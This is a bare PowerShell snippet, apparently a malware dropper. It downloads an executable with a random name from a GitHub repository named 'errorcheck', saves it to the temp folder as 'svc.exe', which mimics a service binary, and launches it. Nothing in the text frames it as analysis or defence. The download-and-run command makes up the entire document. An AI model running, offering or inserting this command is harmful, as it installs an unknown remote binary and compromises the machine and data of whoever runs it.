$url = "https://github.com/nagibatorm55-ops/errorcheck/raw/refs/heads/main/i06473dr7ygcah7o.exe"
$path = "$env:TEMP\svc.exe"
irm $url -OutFile $path
Start-Process -FilePath $path
